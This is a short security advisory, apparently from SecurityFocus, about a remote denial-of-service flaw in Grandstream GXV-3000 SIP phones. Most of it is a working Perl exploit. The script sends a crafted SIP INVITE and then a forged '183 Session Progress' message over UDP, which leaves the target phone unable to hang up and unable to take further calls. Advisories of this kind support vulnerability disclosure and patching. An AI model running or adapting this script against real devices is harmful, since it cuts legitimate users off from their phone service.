source: http://www.securityfocus.com/bid/25399/info

Grandstream GXV-3000 phones are prone to a remote denial-of-service vulnerability.

Exploiting this issue allows remote attackers to cause the device to accept a phone while being unable to hang up. This effectively denies service to legitimate users because further calls will not be accepted by the device. 

#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username> <src> <port> <username>" unless ($ARGV[5]);



$socket=new IO::Socket::INET->new(

        Proto=>'udp',

                               LocalPort => $ARGV[4],

                               PeerPort=>$ARGV[1],

        PeerAddr=>$ARGV[0]);



$sdp= "v=0\r

o=username 0 0 IN IP4 $ARGV[3]\r

s=The Funky Flow\r

c=IN IP4 $ARGV[3]\r

t=0 0\r

m=audio 33404 RTP/AVP 3 97 0 8\r

a=rtpmap:0 PCMU/8000\r

a=rtpmap:3 GSM/8000\r

a=rtpmap:8 PCMA/8000\r

a=rtpmap:97 iLBC/8000\r

a=fmtp:97 mode=30\r\n";

$sdplen= length $sdp;

$msg= "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r

Via: SIP/2.0/UDP $ARGV[3];branch=001;rport=$ARGV[4]\r

From: <sip:$ARGV[5]\@$ARGV[3]>\r

To:  <sip:$ARGV[2]\@$ARGV[0]>\r

Contact: <sip:$ARGV[5]\@$ARGV[3]>\r

Call-ID: ougui\@$ARGV[3]\r

CSeq: 10419 INVITE\r

Max-Forwards: 70\r

Content-Type: application/sdp\r

Content-Length: $sdplen\r

\r

$sdp";

$socket->send($msg);

sleep(3);

$msg=

"SIP/2.0 183 Session Progress\r

Via: SIP/2.0/UDP $ARGV[3];branch=001;rport=$ARGV[4]\r

From: <sip:$ARGV[5]\@$ARGV[3]>\r

To: <sip:$ARGV[2]\@$ARGV[0]>\r

Call-ID: ougui\@$ARGV[3]\r

CSeq: 10419 INVITE\r

Max-Forwards: 70\r

Contact: <sip:$ARGV[5]\@$ARGV[3]>\r

Content-Type: application/sdp\r

Content-Length: $sdplen\r

\r

$sdp";



$socket->send($msg);

